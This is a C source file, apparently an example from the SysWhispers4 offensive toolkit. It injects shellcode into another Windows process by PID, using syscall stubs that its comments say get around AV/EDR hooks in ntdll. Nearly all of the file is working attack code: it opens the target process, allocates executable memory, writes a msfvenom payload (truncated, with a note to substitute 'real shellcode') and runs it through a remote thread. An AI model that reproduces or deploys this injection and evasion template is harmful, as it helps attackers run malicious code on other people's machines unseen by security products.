/*
 * SysWhispers4 — Example: Remote shellcode injection
 *
 * Generated with:
 *   python syswhispers.py --preset injection --functions NtWaitForSingleObject \
 *       --method indirect --resolve halos_gate --out-dir examples/ \
 *       --prefix SW4_mingw -c mingw
 *
 * Compile (MinGW cross-compile, Linux → Windows PE):
 *   make          — uses Makefile (x86_64-w64-mingw32-gcc)
 *
 * Compile (MSVC, from a Visual Studio Developer Prompt):
 *   nmake /f NMakefile
 */
#include <stdio.h>
#include <stdlib.h>  /* strtoul */

/* Compiler-agnostic header selection.
 * SW4_mingw_* symbols are defined as aliases so the call sites below need
 * no changes regardless of which compiler is used. */
#ifdef _MSC_VER
#  include "SW4_msvcSyscalls.h"
#  define SW4_mingw_Initialize              SW4_msvc_Initialize
#  define SW4_mingw_NtOpenProcess           SW4_msvc_NtOpenProcess
#  define SW4_mingw_NtAllocateVirtualMemory SW4_msvc_NtAllocateVirtualMemory
#  define SW4_mingw_NtWriteVirtualMemory    SW4_msvc_NtWriteVirtualMemory
#  define SW4_mingw_NtProtectVirtualMemory  SW4_msvc_NtProtectVirtualMemory
#  define SW4_mingw_NtCreateThreadEx        SW4_msvc_NtCreateThreadEx
#  define SW4_mingw_NtWaitForSingleObject   SW4_msvc_NtWaitForSingleObject
#  define SW4_mingw_NtClose                 SW4_msvc_NtClose
#else
#  include "SW4_mingwSyscalls.h"
#endif

/* msfvenom -p windows/x64/exec CMD=calc.exe -f c */
static const unsigned char shellcode[] = {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
    /* ... truncated for brevity — replace with real shellcode ... */
};

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <target-pid>\n", argv[0]);
        fprintf(stderr, "       Must be run as Administrator with SeDebugPrivilege.\n");
        return 1;
    }
    DWORD targetPid = (DWORD)strtoul(argv[1], NULL, 0);
    if (targetPid == 0) {
        fprintf(stderr, "[!] Invalid PID: %s\n", argv[1]);
        return 1;
    }

    /* ----- Initialize SysWhispers4 (resolves SSNs via FreshyCalls) ----- */
    if (!SW4_mingw_Initialize()) {
        fprintf(stderr, "[!] SW4_mingw_Initialize failed\n");
        return 1;
    }
    printf("[+] Initialized\n");

    /* ----- Self-test: open own process to verify syscall dispatch ----- */
    {
        HANDLE hSelf = NULL;
        OBJECT_ATTRIBUTES selfAttr;
        InitializeObjectAttributes(&selfAttr, NULL, 0, NULL, NULL);
        DWORD ownPid = GetCurrentProcessId();
        CLIENT_ID selfCid = { (PVOID)(ULONG_PTR)ownPid, NULL };
        NTSTATUS st = SW4_mingw_NtOpenProcess(
            &hSelf, PROCESS_QUERY_LIMITED_INFORMATION, &selfAttr, &selfCid);
        if (!NT_SUCCESS(st)) {
            fprintf(stderr, "[!] Self-test failed: NtOpenProcess(own PID %lu) = 0x%08lX\n"
                            "[i] Likely cause: wrong SSN - ntdll may be hooked by AV/EDR.\n"
                            "[i] Try a different --resolve method (e.g. hells-gate).\n",
                    ownPid, st);
            return 1;
        }
        SW4_mingw_NtClose(hSelf);
        printf("[+] Self-test passed (own PID %lu)\n", ownPid);
    }

    /* ----- Open target process via syscall ----- */
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };

    NTSTATUS status = SW4_mingw_NtOpenProcess(
        &hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ |
            PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION,
        &objAttr,
        &cid
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtOpenProcess(PID %lu) failed: 0x%08lX\n"
                        "[i] 0xC0000022 = ACCESS_DENIED  -> run as Administrator\n"
                        "[i] 0xC000000B = INVALID_CID    -> PID does not exist\n"
                        "[i] 0xC0000008 = INVALID_HANDLE -> process is PPL-protected\n",
                targetPid, status);
        return 1;
    }
    printf("[+] Opened process %lu -> handle 0x%p\n", targetPid, hProcess);

    /* ----- Allocate RWX memory in target process ----- */
    PVOID  remoteBase = NULL;
    SIZE_T regionSize = sizeof(shellcode);
    status = SW4_mingw_NtAllocateVirtualMemory(
        hProcess,
        &remoteBase,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
        SW4_mingw_NtClose(hProcess);
        return 1;
    }
    printf("[+] Allocated 0x%llu bytes at 0x%p\n", (ULONG64)regionSize, remoteBase);

    /* ----- Write shellcode ----- */
    SIZE_T written = 0;
    status = SW4_mingw_NtWriteVirtualMemory(
        hProcess,
        remoteBase,
        (PVOID)shellcode,
        sizeof(shellcode),
        &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08lX\n", status);
        SW4_mingw_NtClose(hProcess);
        return 1;
    }
    printf("[+] Wrote %llu bytes of shellcode\n", (ULONG64)written);

    /* ----- Change to RX (optional — good practice) ----- */
    ULONG oldProtect = 0;
    status = SW4_mingw_NtProtectVirtualMemory(
        hProcess,
        &remoteBase,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    /* ----- Create remote thread to execute shellcode ----- */
    HANDLE hThread = NULL;
    status = SW4_mingw_NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        remoteBase,   /* StartRoutine */
        NULL,         /* Argument */
        0,            /* CreateFlags */
        0, 0, 0,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08lX\n", status);
        SW4_mingw_NtClose(hProcess);
        return 1;
    }
    printf("[+] Remote thread created: handle 0x%p\n", hThread);

    /* ----- Wait for completion ----- */
    SW4_mingw_NtWaitForSingleObject(hThread, FALSE, NULL);

    SW4_mingw_NtClose(hThread);
    SW4_mingw_NtClose(hProcess);
    printf("[+] Done.\n");
    return 0;
}
